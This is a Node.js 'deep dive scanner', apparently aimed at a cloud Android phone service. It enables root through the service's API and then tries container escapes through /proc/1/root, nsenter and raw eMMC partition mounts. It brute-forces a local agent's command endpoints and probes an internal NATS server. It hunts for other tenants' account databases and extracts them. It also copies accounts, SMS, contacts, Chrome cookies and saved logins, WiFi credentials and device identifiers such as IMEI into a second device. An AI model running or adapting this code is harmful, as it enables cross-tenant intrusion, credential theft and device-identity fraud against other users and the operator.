#!/usr/bin/env node
/**
 * DEEP DIVE SCANNER - Follow up on promising vectors
 * ===================================================
 * 
 * Key discoveries from Phase 1 scan:
 * 1. /proc/1/root bind mount SUCCEEDS → host filesystem access
 * 2. Full capabilities: CapEff=000001ffffffffff
 * 3. Physical eMMC visible: mmcblk0 with 7+ partitions
 * 4. Foreign dm-0,1,2 exist (busy — already mounted)
 * 5. NATS at 192.168.200.51:8222 (auth_required)
 * 6. Local agent at 127.0.0.1:8779
 * 7. nsenter -t1 -m works but /proc/1/ns/ipc missing
 * 8. SELinux context: u:r:xu_daemon:s0
 */

const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, hmacSign, api, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'deep_dive_results');

const W = ms => new Promise(r => setTimeout(r, ms));
if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => { const fp = `${OUT}/${f}`; const dir = path.dirname(fp); if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); fs.writeFileSync(fp, typeof d === 'string' ? d : JSON.stringify(d, null, 2)); };
const RESULTS = {};

// ══════════════════════════════════════════════════════════════════════════
// DIVE 1: /proc/1/root HOST FILESYSTEM EXPLORATION
// ══════════════════════════════════════════════════════════════════════════
async function dive1_procRoot() {
  console.log('\n' + '█'.repeat(70));
  console.log('  DIVE 1: /proc/1/root HOST FILESYSTEM');
  console.log('█'.repeat(70));

  const pad = D1;

  // 1a: What is PID 1 inside our container?
  P('[1a] PID 1 identity...');
  const pid1 = await sh(pad, 'cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "; echo ""; cat /proc/1/comm 2>/dev/null; cat /proc/1/status 2>/dev/null | head -10', 15);
  P(`  PID1: ${pid1.slice(0, 150)}`);
  RESULTS.pid1_identity = pid1;

  // 1b: Bind mount /proc/1/root and explore
  P('[1b] Bind mount /proc/1/root...');
  await sh(pad, 'mkdir -p /data/local/tmp/hostroot 2>/dev/null', 5);
  const bindResult = await sh(pad, 'mount --bind /proc/1/root /data/local/tmp/hostroot 2>&1; echo "RC:$?"', 15);
  P(`  Bind: ${bindResult}`);

  if (bindResult.includes('RC:0')) {
    // Explore top level
    const topLevel = await sh(pad, 'ls -la /data/local/tmp/hostroot/ 2>/dev/null', 15);
    P(`  Top level: ${topLevel.slice(0, 200)}`);
    save('hostroot_ls.txt', topLevel);
    RESULTS.hostroot_top = topLevel;

    // Check if it's the same as our / or actually host
    const isHost = await sh(pad, [
      'echo "=== HOSTNAME ==="',
      'cat /data/local/tmp/hostroot/etc/hostname 2>/dev/null || echo "no hostname"',
      'echo "=== OUR HOSTNAME ==="',
      'hostname',
      'echo "=== INIT ==="',
      'file /data/local/tmp/hostroot/init 2>/dev/null || ls -la /data/local/tmp/hostroot/init 2>/dev/null',
      'echo "=== SYSTEM BUILD ==="',
      'head -5 /data/local/tmp/hostroot/system/build.prop 2>/dev/null',
    ].join('; '), 15);
    P(`  Host check: ${isHost.slice(0, 200)}`);
    RESULTS.hostroot_check = isHost;

    // Explore /data on bind mount
    const dataDir = await sh(pad, 'ls -la /data/local/tmp/hostroot/data/ 2>/dev/null | head -20', 15);
    P(`  /data: ${dataDir.slice(0, 200)}`);
    save('hostroot_data.txt', dataDir);

    // Clean up
    await sh(pad, 'umount /data/local/tmp/hostroot 2>/dev/null', 5);
  }

  // 1c: Direct /proc/1/root access without bind mount
  P('[1c] Direct /proc/1/root access...');
  const direct = await sh(pad, [
    'ls /proc/1/root/ 2>/dev/null | head -15',
    'echo "=== DATA ==="',
    'ls /proc/1/root/data/ 2>/dev/null | head -15',
    'echo "=== DATA/DATA ==="',
    'ls /proc/1/root/data/data/ 2>/dev/null | head -20',
    'echo "=== SYSTEM CE ==="',
    'ls /proc/1/root/data/system_ce/0/ 2>/dev/null | head -10',
  ].join('; '), 20);
  P(`  Direct: ${direct.slice(0, 200)}`);
  save('proc1_root_direct.txt', direct);
  RESULTS.proc1_root = direct;

  // 1d: Check OTHER PIDs' /proc/PID/root — may see different containers
  P('[1d] Checking other PIDs root directories...');
  const otherPids = await sh(pad, [
    'for p in $(ls /proc/ | grep -E "^[0-9]+$" | sort -n); do',
    '  r=$(readlink /proc/$p/root 2>/dev/null)',
    '  c=$(cat /proc/$p/comm 2>/dev/null)',
    '  [ -n "$r" ] && [ "$r" != "/" ] && echo "PID:$p ROOT:$r COMM:$c"',
    'done 2>/dev/null | head -30',
  ].join('\n'), 30);
  save('other_pid_roots.txt', otherPids);
  RESULTS.other_pid_roots = otherPids;
  for (const l of otherPids.split('\n')) if (l.trim()) P(`  ${l}`);

  // 1e: Check ALL namespace IDs — find processes in DIFFERENT namespaces
  P('[1e] Namespace comparison...');
  const nsComp = await sh(pad, [
    'SELF_MNT=$(readlink /proc/self/ns/mnt)',
    'echo "OUR_MNT=$SELF_MNT"',
    'for p in $(ls /proc/ | grep -E "^[0-9]+$" | sort -n | head -100); do',
    '  mnt=$(readlink /proc/$p/ns/mnt 2>/dev/null)',
    '  if [ -n "$mnt" ] && [ "$mnt" != "$SELF_MNT" ]; then',
    '    echo "DIFF_NS:$p MNT:$mnt COMM:$(cat /proc/$p/comm 2>/dev/null)"',
    '  fi',
    'done',
  ].join('\n'), 30);
  save('namespace_diff.txt', nsComp);
  RESULTS.ns_diff = nsComp;
  for (const l of nsComp.split('\n')) if (l.includes('DIFF_NS') || l.includes('OUR_MNT')) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════
// DIVE 2: PHYSICAL eMMC PARTITION EXPLORATION
// ══════════════════════════════════════════════════════════════════════════
async function dive2_emmc() {
  console.log('\n' + '█'.repeat(70));
  console.log('  DIVE 2: PHYSICAL eMMC PARTITIONS');
  console.log('█'.repeat(70));

  const pad = D1;

  // 2a: Full partition table
  P('[2a] Partition table...');
  const parts = await sh(pad, [
    'ls -la /dev/block/mmcblk0p* 2>/dev/null',
    'echo "=== BY-NAME ==="',
    'ls -la /dev/block/by-name/ 2>/dev/null',
    'echo "=== PARTITIONS ==="',
    'cat /proc/partitions 2>/dev/null',
  ].join('; '), 20);
  save('partitions.txt', parts);
  RESULTS.partitions = parts;
  for (const l of parts.split('\n').slice(0, 25)) P(`  ${l}`);

  // 2b: Read partition headers to identify filesystem types
  P('[2b] Partition types...');
  const ptypes = await sh(pad, [
    'for p in /dev/block/mmcblk0p{1,2,3,4,5,6,7}; do',
    '  magic=$(dd if=$p bs=1 count=8 skip=1080 2>/dev/null | xxd -p 2>/dev/null | head -c 8)',
    '  echo "$p magic=$magic"',
    'done',
    'echo "=== BLKID ==="',
    'blkid /dev/block/mmcblk0p* 2>/dev/null || echo "no blkid"',
  ].join('\n'), 20);
  save('partition_types.txt', ptypes);
  RESULTS.ptypes = ptypes;
  for (const l of ptypes.split('\n')) if (l.trim()) P(`  ${l}`);

  // 2c: Try reading raw data from mmcblk0 partitions
  P('[2c] Scanning raw partition data...');
  for (let i = 1; i <= 7; i++) {
    const dev = `/dev/block/mmcblk0p${i}`;
    await sh(pad, 'mkdir -p /data/local/tmp/partmount 2>/dev/null', 3);

    // Try ext4
    const ext4 = await sh(pad, `mount -t ext4 -o ro ${dev} /data/local/tmp/partmount 2>&1; echo "RC:$?"`, 10);
    if (ext4.includes('RC:0')) {
      const contents = await sh(pad, 'ls -la /data/local/tmp/partmount/ 2>/dev/null | head -15; echo "=== SIZE ==="; du -sh /data/local/tmp/partmount/ 2>/dev/null', 10);
      P(`  mmcblk0p${i} (ext4): ${contents.slice(0, 100)}`);
      save(`partition_p${i}_ext4.txt`, contents);
      RESULTS[`part_p${i}`] = contents;
      await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 5);
      continue;
    }
    await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 3);

    // Try f2fs
    const f2fs = await sh(pad, `mount -t f2fs -o ro ${dev} /data/local/tmp/partmount 2>&1; echo "RC:$?"`, 10);
    if (f2fs.includes('RC:0')) {
      const contents = await sh(pad, 'ls -la /data/local/tmp/partmount/ 2>/dev/null | head -15', 10);
      P(`  mmcblk0p${i} (f2fs): ${contents.slice(0, 100)}`);
      save(`partition_p${i}_f2fs.txt`, contents);
      RESULTS[`part_p${i}`] = contents;
      await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 5);
      continue;
    }
    await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 3);

    // Try vfat
    const vfat = await sh(pad, `mount -t vfat -o ro ${dev} /data/local/tmp/partmount 2>&1; echo "RC:$?"`, 10);
    if (vfat.includes('RC:0')) {
      const contents = await sh(pad, 'ls -la /data/local/tmp/partmount/ 2>/dev/null | head -10', 10);
      P(`  mmcblk0p${i} (vfat): ${contents.slice(0, 100)}`);
      await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 5);
      continue;
    }
    await sh(pad, 'umount /data/local/tmp/partmount 2>/dev/null', 3);

    P(`  mmcblk0p${i}: not mountable`);
  }

  // 2d: Check what dm-0,1,2 actually are
  P('[2d] Investigating dm-0, dm-1, dm-2...');
  const dmInfo = await sh(pad, [
    'for dm in 0 1 2; do',
    '  echo "=== dm-$dm ==="',
    '  cat /sys/block/dm-$dm/dm/name 2>/dev/null || echo "no name"',
    '  cat /sys/block/dm-$dm/size 2>/dev/null || echo "no size"',
    '  cat /sys/block/dm-$dm/dm/uuid 2>/dev/null || echo "no uuid"',
    '  ls -la /sys/block/dm-$dm/slaves/ 2>/dev/null || echo "no slaves"',
    'done',
  ].join('\n'), 20);
  save('dm_info.txt', dmInfo);
  RESULTS.dm_info = dmInfo;
  for (const l of dmInfo.split('\n')) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════
// DIVE 3: LOCAL AGENT + NATS DEEP PROBE
// ══════════════════════════════════════════════════════════════════════════
async function dive3_agentNats() {
  console.log('\n' + '█'.repeat(70));
  console.log('  DIVE 3: LOCAL AGENT + NATS DEEP PROBE');
  console.log('█'.repeat(70));

  const pad = D1;

  // 3a: Find agent binary and config
  P('[3a] Finding agent binary...');
  const agentFind = await sh(pad, [
    'find / -maxdepth 4 -name "armcloud*" -o -name "agent*" -o -name "vcpcloud*" 2>/dev/null | grep -v proc | head -20',
    'echo "=== LISTENING ==="',
    'ss -tlnp 2>/dev/null | grep -E "(8779|4222|8080)"',
    'echo "=== AGENT PROC ==="',
    'ps -A 2>/dev/null | grep -iE "(agent|armcloud|vcp|nats)" | head -10',
  ].join('; '), 20);
  save('agent_find.txt', agentFind);
  RESULTS.agent_find = agentFind;
  for (const l of agentFind.split('\n')) if (l.trim()) P(`  ${l}`);

  // 3b: Deep agent endpoint enumeration
  P('[3b] Agent endpoint bruteforce...');
  const endpoints = [
    '/', '/info', '/status', '/health', '/version',
    '/api', '/api/v1', '/api/v1/status', '/api/v1/cmd', '/api/v1/exec',
    '/api/v1/shell', '/api/v1/pad', '/api/v1/device', '/api/v1/sync',
    '/cmd', '/exec', '/shell', '/run', '/sync', '/script',
    '/syncCmd', '/pad', '/device', '/task', '/upload', '/download',
    '/property', '/getprop', '/setprop', '/install', '/uninstall',
    '/screenshot', '/reboot', '/root', '/adb',
    '/v1/cmd', '/v1/exec', '/v1/sync', '/v1/pad',
    '/vcp/cmd', '/vcp/exec', '/vcp/sync',
    '/armcloud/cmd', '/armcloud/exec', '/armcloud/sync',
    '/proxy', '/proxy/info', '/proxy/set',
    '/nats', '/nats/pub', '/nats/sub',
    '/config', '/env', '/debug', '/metrics',
  ];

  const agentResults = {};
  for (const ep of endpoints) {
    const r = await sh(pad, `curl -s -m2 http://127.0.0.1:8779${ep} 2>/dev/null | head -c 200`, 5);
    if (r && r.length > 0 && !r.includes('unknown url') && !r.startsWith('[')) {
      agentResults[ep] = r;
      P(`  ★ ${ep}: ${r.slice(0, 80)}`);
    }
  }
  save('agent_endpoints.json', agentResults);
  RESULTS.agent_endpoints = agentResults;

  // 3c: Try POST requests to agent
  P('[3c] Agent POST requests...');
  const postEndpoints = [
    ['/cmd', '{"cmd":"id"}'],
    ['/exec', '{"command":"id"}'],
    ['/syncCmd', '{"scriptContent":"id"}'],
    ['/api/v1/exec', '{"cmd":"id"}'],
    ['/run', '{"script":"id"}'],
    ['/shell', '{"command":"id"}'],
  ];
  for (const [ep, body] of postEndpoints) {
    const r = await sh(pad, `curl -s -m3 -X POST -H "Content-Type: application/json" -d '${body}' http://127.0.0.1:8779${ep} 2>/dev/null | head -c 200`, 8);
    if (r && r.length > 0 && !r.includes('unknown url')) {
      P(`  ★ POST ${ep}: ${r.slice(0, 80)}`);
      RESULTS[`agent_post_${ep}`] = r;
    }
  }

  // 3d: NATS deep probing
  P('[3d] NATS server probing...');
  const natsEndpoints = [
    '/varz', '/connz', '/routez', '/subsz', '/healthz',
    '/connz?subs=1', '/subsz?subs=1', '/jsz', '/accountz',
  ];
  for (const ep of natsEndpoints) {
    const r = await sh(pad, `curl -s -m5 "http://192.168.200.51:8222${ep}" 2>/dev/null | head -c 500`, 10);
    if (r && r.length > 10) {
      const name = ep.split('?')[0].replace('/', '');
      save(`nats_${name}.json`, r);
      P(`  NATS ${ep}: ${r.slice(0, 80)}`);
      RESULTS[`nats_${ep}`] = r;
    }
  }

  // 3e: Try to discover agent's actual API paths from binary
  P('[3e] Agent binary analysis...');
  const agentBin = await sh(pad, [
    'find / -maxdepth 5 -type f -executable 2>/dev/null | xargs file 2>/dev/null | grep -i "elf\\|go\\|executable" | grep -iv "proc\\|sys" | head -20',
    'echo "=== STRINGS FROM AGENT ==="',
    'PID=$(ss -tlnp 2>/dev/null | grep 8779 | grep -o "pid=[0-9]*" | cut -d= -f2)',
    '[ -n "$PID" ] && strings /proc/$PID/exe 2>/dev/null | grep -iE "(http|api|path|route|endpoint|cmd|exec|sync)" | sort -u | head -30',
  ].join('\n'), 30);
  save('agent_binary_analysis.txt', agentBin);
  RESULTS.agent_binary = agentBin;
  for (const l of agentBin.split('\n')) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════
// DIVE 4: NSENTER VARIATIONS + ALTERNATIVE ESCAPE METHODS
// ══════════════════════════════════════════════════════════════════════════
async function dive4_escapeVariations() {
  console.log('\n' + '█'.repeat(70));
  console.log('  DIVE 4: ESCAPE VARIATIONS');
  console.log('█'.repeat(70));

  const pad = D1;

  // 4a: nsenter with individual namespace flags (since -i failed)
  P('[4a] nsenter individual namespace flags...');
  const nsFlags = [
    '-t 1 -m',
    '-t 1 -n',
    '-t 1 -p',
    '-t 1 -u',
    '-t 1 -m -u',
    '-t 1 -m -n',
    '-t 1 -m -p',
    '-t 1 -m -u -n -p',
    '-t 1 -m -u -n',
  ];
  for (const flags of nsFlags) {
    const r = await sh(pad, `nsenter ${flags} -- sh -c "hostname; id; ls / | head -5" 2>&1`, 10);
    const status = r.includes('uid=') ? '✓' : (r.includes('No such') ? 'NS_MISSING' : '✗');
    P(`  nsenter ${flags}: ${status} → ${r.slice(0, 80)}`);
    RESULTS[`nsenter_${flags.replace(/ /g, '_')}`] = r;
  }

  // 4b: nsenter -t1 -m works — use it to explore host mount namespace
  P('[4b] Host mount namespace via nsenter -t1 -m...');
  const hostMnt = await sh(pad, 'nsenter -t 1 -m -- sh -c "cat /proc/mounts | head -30" 2>&1', 15);
  save('host_mount_ns_mounts.txt', hostMnt);
  RESULTS.host_mnt_mounts = hostMnt;
  for (const l of hostMnt.split('\n').slice(0, 10)) P(`  ${l}`);

  // 4c: Via host mount namespace — find ALL data directories
  P('[4c] Host mount NS — find data dirs...');
  const hostData = await sh(pad, 'nsenter -t 1 -m -- sh -c "find / -maxdepth 3 -name data -type d 2>/dev/null | head -20" 2>&1', 20);
  save('host_data_dirs.txt', hostData);
  RESULTS.host_data_dirs = hostData;
  for (const l of hostData.split('\n')) if (l.trim()) P(`  ${l}`);

  // 4d: Via host mount — look for container root directories
  P('[4d] Container root directories on host...');
  const containerDirs = await sh(pad, 'nsenter -t 1 -m -- sh -c "find / -maxdepth 4 -name build.prop -path \\\"*/system/*\\\" 2>/dev/null | head -20" 2>&1', 30);
  save('container_build_props.txt', containerDirs);
  RESULTS.container_dirs = containerDirs;
  for (const l of containerDirs.split('\n')) if (l.trim()) P(`  ${l}`);

  // 4e: If container dirs found, read their build.prop
  if (containerDirs && containerDirs.includes('build.prop') && !containerDirs.includes('[')) {
    for (const line of containerDirs.split('\n').filter(l => l.includes('build.prop')).slice(0, 3)) {
      const bpPath = line.trim();
      P(`  Reading ${bpPath}...`);
      const bp = await sh(pad, `nsenter -t 1 -m -- sh -c "head -20 '${bpPath}' 2>/dev/null" 2>&1`, 15);
      const dir = path.dirname(path.dirname(bpPath));
      P(`    ${bp.split('\n').slice(0, 3).join(' | ')}`);
      save(`neighbor_build_${bpPath.replace(/\//g, '_')}.txt`, bp);

      // Try to access data directory next to system
      const dataPath = dir + '/data';
      const dataCheck = await sh(pad, `nsenter -t 1 -m -- sh -c "ls '${dataPath}/' 2>/dev/null | head -10" 2>&1`, 10);
      if (dataCheck && dataCheck.length > 5 && !dataCheck.startsWith('[')) {
        P(`    ★ DATA DIR: ${dataCheck.slice(0, 80)}`);
        RESULTS[`neighbor_data_${dir}`] = dataCheck;

        // Check for accounts
        const accounts = await sh(pad, `nsenter -t 1 -m -- sh -c "ls '${dataPath}/system_ce/0/' 2>/dev/null" 2>&1`, 10);
        P(`    system_ce: ${accounts.slice(0, 80)}`);

        // Extract accounts_ce.db
        const acctDb = await sh(pad, `nsenter -t 1 -m -- sh -c "base64 '${dataPath}/system_ce/0/accounts_ce.db' 2>/dev/null" 2>&1`, 30);
        if (acctDb && acctDb.length > 100 && !acctDb.startsWith('[')) {
          P(`    ★★★ NEIGHBOR ACCOUNTS DB: ${acctDb.length} b64 chars ★★★`);
          save(`neighbor_accounts_${dir.replace(/\//g, '_')}.b64`, acctDb);
          RESULTS.neighbor_accounts_found = true;
          RESULTS.neighbor_accounts_path = dataPath;
          RESULTS.neighbor_accounts_size = acctDb.length;
        }
      }
    }
  }

  // 4f: Alternative escape — use raw /dev/block access to read partitions
  P('[4f] Raw block device read for neighbor detection...');
  const rawBlock = await sh(pad, [
    'echo "=== DM TABLE ==="',
    'dmsetup table 2>/dev/null | head -10',
    'echo "=== DM STATUS ==="',
    'dmsetup status 2>/dev/null | head -10',
    'echo "=== DM LS ==="',
    'dmsetup ls 2>/dev/null | head -10',
  ].join('; '), 15);
  save('dmsetup_info.txt', rawBlock);
  RESULTS.dmsetup = rawBlock;
  for (const l of rawBlock.split('\n')) if (l.trim()) P(`  ${l}`);

  // 4g: Search for other containers via /proc/*/mountinfo
  P('[4g] /proc mountinfo analysis...');
  const mountinfo = await sh(pad, [
    'cat /proc/1/mountinfo 2>/dev/null | grep -E "(overlay|container|android)" | head -20',
    'echo "=== UNIQUE ROOTS ==="',
    'for p in $(ls /proc/ | grep -E "^[0-9]+$" | head -50); do',
    '  r=$(cat /proc/$p/mountinfo 2>/dev/null | head -1 | awk "{print \\$4}")',
    '  [ -n "$r" ] && echo "$p:$r"',
    'done | sort -t: -k2 -u | head -20',
  ].join('\n'), 30);
  save('mountinfo_analysis.txt', mountinfo);
  RESULTS.mountinfo = mountinfo;
  for (const l of mountinfo.split('\n').slice(0, 15)) if (l.trim()) P(`  ${l}`);
}

// ══════════════════════════════════════════════════════════════════════════
// DIVE 5: FULL CLONE WITH EVERYTHING FOUND
// ══════════════════════════════════════════════════════════════════════════
async function dive5_clone() {
  console.log('\n' + '█'.repeat(70));
  console.log('  DIVE 5: COMPREHENSIVE CLONE');
  console.log('█'.repeat(70));

  const pad = D1;

  // If we found neighbor data via escape, extract and clone that
  if (RESULTS.neighbor_accounts_found) {
    P('★ Cloning NEIGHBOR data to both devices!');
    // This will be filled in if neighbor data was found
    return;
  }

  // Otherwise: Extract EVERYTHING from D1, clone to D2
  P('[5a] Full extraction from D1...');

  // Get ALL properties
  const allProps = await sh(pad, 'getprop 2>/dev/null', 30);
  const propMap = {};
  for (const line of allProps.split('\n')) {
    const m = line.match(/^\[([^\]]+)\]:\s*\[([^\]]*)\]$/);
    if (m && m[2]) propMap[m[1]] = m[2];
  }
  save('all_props.json', propMap);
  P(`  ${Object.keys(propMap).length} total properties`);

  // Get app accounts via dumpsys
  const accountDump = await sh(pad, 'dumpsys account 2>/dev/null', 30);
  save('account_dump.txt', accountDump);
  P(`  Account dump: ${accountDump.split('\n').length} lines`);

  // Get proxy settings
  const proxy = await sh(pad, [
    'settings get global http_proxy 2>/dev/null',
    'settings get global global_http_proxy_host 2>/dev/null',
    'settings get global global_http_proxy_port 2>/dev/null',
    'getprop ro.sys.cloud.proxy.type 2>/dev/null',
    'getprop ro.sys.cloud.proxy.mode 2>/dev/null',
    'getprop ro.sys.cloud.proxy.data 2>/dev/null',
    'iptables -t nat -L -n 2>/dev/null | head -20',
  ].join('; echo "---"; '), 20);
  save('proxy_config.txt', proxy);
  P(`  Proxy: ${proxy.slice(0, 150)}`);

  // Extract databases
  P('[5b] Extracting all databases...');
  const dbPaths = {
    accounts_ce: '/data/system_ce/0/accounts_ce.db',
    accounts_de: '/data/system_de/0/accounts_de.db',
    contacts: '/data/data/com.android.providers.contacts/databases/contacts2.db',
    calllog: '/data/data/com.android.providers.contacts/databases/calllog.db',
    sms: '/data/data/com.android.providers.telephony/databases/mmssms.db',
    chrome_cookies: '/data/data/com.android.chrome/app_chrome/Default/Cookies',
    chrome_history: '/data/data/com.android.chrome/app_chrome/Default/History',
    chrome_login: '/data/data/com.android.chrome/app_chrome/Default/Login Data',
    chrome_webdata: '/data/data/com.android.chrome/app_chrome/Default/Web Data',
    chrome_bookmarks: '/data/data/com.android.chrome/app_chrome/Default/Bookmarks',
    settings_secure: '/data/system/users/0/settings_secure.xml',
    settings_system: '/data/system/users/0/settings_system.xml',
    settings_global: '/data/system/users/0/settings_global.xml',
    wifi_config: '/data/misc/wifi/WifiConfigStore.xml',
  };

  const extracted = {};
  for (const [name, dbpath] of Object.entries(dbPaths)) {
    const isXml = dbpath.endsWith('.xml');
    const cmd = isXml ? `cat "${dbpath}" 2>/dev/null` : `base64 "${dbpath}" 2>/dev/null | head -c 100000`;
    const r = await sh(pad, cmd, 45);
    if (r && r.length > 50 && !r.startsWith('[')) {
      extracted[name] = { data: r, path: dbpath, isXml };
      save(`extract_${name}.${isXml ? 'xml' : 'b64'}`, r);
      P(`  ✓ ${name}: ${r.length} ${isXml ? 'chars' : 'b64'}`);
    }
  }

  // Extract app list with data sizes
  const appList = await sh(pad, 'pm list packages -f 2>/dev/null | head -50', 20);
  save('app_list.txt', appList);

  // [5c] Inject EVERYTHING into D2
  P('\n[5c] Injecting into D2...');
  const cloneResult = { props: 0, dbs: 0, failed: 0 };

  // Key properties to clone
  const cloneProps = [
    'ro.product.model', 'ro.product.brand', 'ro.product.manufacturer',
    'ro.product.device', 'ro.product.name', 'ro.product.board',
    'ro.hardware', 'ro.serialno', 'ro.build.fingerprint',
    'ro.build.display.id', 'ro.build.version.release', 'ro.build.version.sdk',
    'persist.sys.cloud.imeinum', 'persist.sys.cloud.imsinum',
    'persist.sys.cloud.iccidnum', 'persist.sys.cloud.phonenum',
    'persist.sys.cloud.macaddress', 'persist.sys.cloud.gps.lat',
    'persist.sys.cloud.gps.lon', 'persist.sys.cloud.drm.id',
    'persist.sys.timezone', 'persist.sys.language', 'persist.sys.country',
  ];

  for (const prop of cloneProps) {
    if (propMap[prop]) {
      const r = await sh(D2, `setprop "${prop}" "${propMap[prop].replace(/"/g, '\\"')}"`, 8);
      r.startsWith('[') ? cloneResult.failed++ : cloneResult.props++;
    }
  }

  // Set android_id
  const aid = await sh(D1, 'settings get secure android_id 2>/dev/null', 8);
  if (aid.match(/^[0-9a-f]+$/)) {
    await sh(D2, `settings put secure android_id "${aid}"`, 8);
    cloneResult.props++;
  }
  P(`  Properties: ${cloneResult.props} cloned`);

  // Inject databases
  for (const [name, info] of Object.entries(extracted)) {
    if (info.isXml) {
      // XML files — base64 encode then inject
      const b64 = Buffer.from(info.data).toString('base64');
      if (b64.length < 60000) {
        const r = await sh(D2, `echo '${b64}' | base64 -d > "${info.path}" 2>/dev/null && echo OK`, 45);
        if (r.includes('OK')) { cloneResult.dbs++; P(`  ✓ ${name}`); }
        else { cloneResult.failed++; P(`  ✗ ${name}`); }
      }
    } else {
      // Binary files — already base64
      if (info.data.length < 60000) {
        const r = await sh(D2, `echo '${info.data}' | base64 -d > "${info.path}" 2>/dev/null && echo OK`, 45);
        if (r.includes('OK')) { cloneResult.dbs++; P(`  ✓ ${name}`); }
        else { cloneResult.failed++; P(`  ✗ ${name}`); }
      }
    }
  }
  P(`  Databases: ${cloneResult.dbs} cloned, ${cloneResult.failed} failed`);

  // Set proxy if found
  if (proxy.includes(':')) {
    const proxyMatch = proxy.match(/(\d+\.\d+\.\d+\.\d+:\d+)/);
    if (proxyMatch) {
      await sh(D2, `settings put global http_proxy "${proxyMatch[1]}"`, 8);
      P(`  Proxy set: ${proxyMatch[1]}`);
    }
  }

  RESULTS.clone = cloneResult;

  // Verify
  P('\n[5d] Verification...');
  for (const t of [D1, D2]) {
    const v = await sh(t, [
      'echo "DEV=' + t + '"',
      'echo "MODEL=$(getprop ro.product.model)"',
      'echo "BRAND=$(getprop ro.product.brand)"',
      'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
      'echo "AID=$(settings get secure android_id 2>/dev/null)"',
      'echo "FP=$(getprop ro.build.fingerprint | head -c 50)"',
      'echo "PROXY=$(settings get global http_proxy 2>/dev/null)"',
      'echo "ACCOUNTS=$(sqlite3 /data/system_ce/0/accounts_ce.db \\"SELECT count(*) FROM accounts\\" 2>/dev/null || echo N/A)"',
    ].join('; '), 20);
    P(`  ${t}:`);
    for (const l of v.split('\n')) if (l.trim()) P(`    ${l}`);
  }
}

// ══════════════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('█'.repeat(75));
  console.log('  DEEP DIVE SCANNER — Independent Research');
  console.log('  Devices: ' + D1 + ' / ' + D2);
  console.log('█'.repeat(75));

  // Enable root first
  await api('/vcpcloud/api/padApi/switchRoot', { padCodes: [D1, D2], rootStatus: 1, rootType: 0 });
  await api('/vcpcloud/api/padApi/switchRoot', { padCodes: [D1, D2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });

  await dive1_procRoot();
  await dive2_emmc();
  await dive3_agentNats();
  await dive4_escapeVariations();
  await dive5_clone();

  save('DEEP_DIVE_RESULTS.json', RESULTS);

  console.log('\n' + '█'.repeat(75));
  console.log('  DEEP DIVE COMPLETE');
  console.log('█'.repeat(75));
  const files = fs.readdirSync(OUT);
  console.log(`  ${files.length} result files in ${OUT}/`);
  for (const f of files.sort()) console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
  console.log('█'.repeat(75));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
